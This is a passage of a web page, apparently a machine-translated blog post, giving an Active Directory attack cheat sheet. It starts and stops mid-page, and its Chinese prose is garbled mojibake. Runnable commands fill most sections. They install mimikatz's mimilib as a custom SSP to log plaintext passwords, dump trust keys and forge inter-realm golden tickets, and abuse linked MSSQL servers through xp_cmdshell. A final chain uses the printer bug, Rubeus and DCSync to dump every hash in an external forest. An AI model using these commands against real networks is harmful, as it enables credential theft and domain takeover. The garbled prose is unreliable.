lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ç„¶ååªéœ€PTHè·å¾—DCçš„æœ¬åœ°ç®¡ç†æƒé™ï¼</p><h1 id="5022" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">è‡ªå®šä¹‰SSP</h1><p id="f274" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:æˆ‘ä»¬å¯ä»¥åœ¨SSPä¸Šè®¾ç½®ä¸€ä¸ªè‡ªå®šä¹‰dllï¼Œä¾‹å¦‚mimikatzçš„mimilib.dllï¼Œå®ƒå°†ç›‘è§†å¹¶æ•è·ç™»å½•ç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼</em></p><p id="1800" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æ¥è‡ªpowershell:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="5d8a" class="nl kw iq my b gy nm nn l no np">#Get current Security Package:<br/>$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'</span><span id="6629" class="nl kw iq my b gy nq nn l no np">#Append mimilib:<br/>$packages += "mimilib"</span><span id="1ff2" class="nl kw iq my b gy nq nn l no np">#Change the new packages name<br/>Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages<br/>Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages</span><span id="91e2" class="nl kw iq my b gy nq nn l no np">#ALTERNATIVE:<br/>Invoke-Mimikatz -Command '"misc::memssp"'</span></pre><p id="c06f" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ç°åœ¨DCä¸Šçš„æ‰€æœ‰ç™»å½•éƒ½è®°å½•åˆ°-&gt; C:\ Windows \ System32 \ kiwissp . log</p><h1 id="fc94" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">è·¨æ—æ”»å‡»</h1><h1 id="6001" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä¿¡ä»»ç¥¨</h1><p id="adc8" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:å¦‚æœæˆ‘ä»¬åœ¨ä¸å¦ä¸€ä¸ªæ—æœ‰åŒå‘ä¿¡ä»»å…³ç³»çš„åŸŸä¸Šæ‹¥æœ‰åŸŸç®¡ç†å‘˜æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾—ä¿¡ä»»å¯†é’¥å¹¶ä¼ªé€ æˆ‘ä»¬è‡ªå·±çš„è·¨é¢†åŸŸTGTã€‚</em></p><p id="9d61" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">âš ï¸:æˆ‘ä»¬çš„è®¿é—®æƒé™å°†ä»…é™äºæˆ‘ä»¬çš„DAå¸æˆ·åœ¨å¦ä¸€ä¸ªæ—ä¸­çš„é…ç½®æƒé™ï¼</p><p id="513e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ä½¿ç”¨Mimikatz:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="b0fd" class="nl kw iq my b gy nm nn l no np">#Dump the trust key<br/>Invoke-Mimikatz -Command '"lsadump::trust /patch"'<br/>Invoke-Mimikatz -Command '"lsadump::lsa /patch"'</span><span id="7810" class="nl kw iq my b gy nq nn l no np">#Forge an inter-realm TGT using the Golden Ticket attack<br/>Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:  <br/>&lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:<br/>&lt;PathToSaveTheGoldenTicket&gt;"'</span></pre><p id="b126" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">-&gt;â—é—¨ç¥¨ã€‚kirbiæ ¼å¼</p><p id="f40e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ç„¶åä½¿ç”¨è·¨åŸŸTGTå‘å¤–éƒ¨æ£®æ—è¯·æ±‚TGSä»¥è·å¾—ä»»ä½•æœåŠ¡ï¼Œå¹¶è®¿é—®èµ„æºï¼</p><p id="e0ca" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ä½¿ç”¨çº¢è‰²:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="6907" class="nl kw iq my b gy nm nn l no np">.\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:"Service's SPN" /ptt</span></pre><h1 id="55b2" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ»¥ç”¨MSSQLæœåŠ¡å™¨</h1><ul class=""><li id="23a1" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated">æšä¸¾MSSQLå®ä¾‹:<code class="fe mv mw mx my b">Get-SQLInstanceDomain</code></li><li id="f85b" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">ä½œä¸ºå½“å‰ç”¨æˆ·æ£€æŸ¥å¯è®¿é—®æ€§:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="f939" class="nl kw iq my b gy nm nn l no np">Get-SQLConnectionTestThreaded<br/>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose</span></pre><ul class=""><li id="3730" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">æ”¶é›†å…³äºå®ä¾‹çš„ä¿¡æ¯:<code class="fe mv mw mx my b">Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></li><li id="3383" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">æ»¥ç”¨SQLæ•°æ®åº“é“¾æ¥:<br/> <em class="of"> WUTæ˜¯DISï¼Ÿ:æ•°æ®åº“é“¾æ¥å…è®¸SQL Serveråƒè®¿é—®å…¶ä»–SQL Serverä¸€æ ·è®¿é—®å…¶ä»–èµ„æºã€‚å¦‚æœæˆ‘ä»¬æœ‰ä¸¤ä¸ªé“¾æ¥çš„SQLæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ã€‚æ•°æ®åº“é“¾æ¥ä¹Ÿé€‚ç”¨äºæ£®æ—ä¿¡ä»»ï¼</em></li></ul><p id="0481" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æ£€æŸ¥ç°æœ‰çš„æ•°æ®åº“é“¾æ¥:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="7fa9" class="nl kw iq my b gy nm nn l no np">#Check for existing Database Links:<br/>#PowerUpSQL:<br/>Get-SQLServerLink -Instace &lt;SPN&gt; -Verbose<br/>     <br/>#MSSQL Query:<br/>select * from master..sysservers</span></pre><p id="3d4e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŸ¥è¯¢æ¥æšä¸¾é“¾æ¥æ•°æ®åº“ä¸­çš„å…¶ä»–é“¾æ¥:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1316" class="nl kw iq my b gy nm nn l no np">#Manualy:<br/>select * from openquery("LinkedDatabase", 'select * from master..sysservers')<br/>     <br/>#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):<br/>Get-SQLServerLinkCrawl -Instance &lt;SPN&gt; -Verbose<br/>     <br/>#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell<br/>#Or if it is disabled enable it:<br/>EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"</span></pre><p id="1c31" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æŸ¥è¯¢æ‰§è¡Œ:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="2929" class="nl kw iq my b gy nm nn l no np">Get-SQLServerLinkCrawl -Instace &lt;SPN&gt; -Query "exec master..xp_cmdshell 'whoami'"</span></pre><h1 id="58c4" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ‰“ç ´æ£®æ—ä¿¡ä»»</h1><p id="62e2" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:<br/>TLï¼›<br/>å¦‚æœæˆ‘ä»¬ä¸ä¸€ä¸ªå¤–éƒ¨æ£®æ—æœ‰åŒå‘ä¿¡ä»»ï¼Œå¹¶ä¸”æˆ‘ä»¬è®¾æ³•å±åŠæœ¬åœ°æ£®æ—ä¸Šä¸€å°å¯ç”¨äº†æ— çº¦æŸå§”æ´¾çš„æœºå™¨(DCé»˜è®¤æœ‰è¿™ä¸ªåŠŸèƒ½)ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨printerbugå¼ºåˆ¶å¤–éƒ¨æ£®æ—æ ¹åŸŸçš„DCå‘æˆ‘ä»¬è®¤è¯ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥æ•è·å®ƒçš„TGTï¼Œå°†å…¶æ³¨å…¥å†…å­˜ï¼Œå¹¶é€šè¿‡DCsyncè½¬å‚¨å®ƒçš„å“ˆå¸Œå€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å®Œå…¨è®¿é—®æ•´ä¸ªæ£®æ—ã€‚</em></p><p id="c820" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æˆ‘ä»¬å°†ä½¿ç”¨çš„å·¥å…·:</p><ul class=""><li id="50d6" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/GhostPack/Rubeus" rel="noopener ugc nofollow" target="_blank">é£ç–¹</a></li><li id="5676" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/leechristensen/SpoolSample" rel="noopener ugc nofollow" target="_blank"> SpoolSample </a></li><li id="8843" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/gentilkiwi/mimikatz" rel="noopener ugc nofollow" target="_blank">ç±³ç±³å¡å…¹</a></li></ul><p id="5ca9" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">åˆ©ç”¨ç¤ºä¾‹:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="44e9" class="nl kw iq my b gy nm nn l no np">#Start monitoring for TGTs with rubeus:<br/>Rubeus.exe monitor /interval:5 /filteruser:target-dc$</span><span id="1592" class="nl kw iq my b gy nq nn l no np">#Execute the printerbug to trigger the force authentication of the target DC to our machine<br/>SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local</span><span id="f214" class="nl kw iq my b gy nq nn l no np">#Get the base64 captured TGT from Rubeus and inject it into memory:<br/>Rubeus.exe ptt /ticket:&lt;Base64ValueofCapturedTicket&gt;</span><span id="ed8c" class="nl kw iq my b gy nq nn l no np">#Dump the hashes of the target domain using mimikatz:<br/>lsadump::dcsync /domain:external.forest.local /all</span></pre></div></div>    
</body>
</html>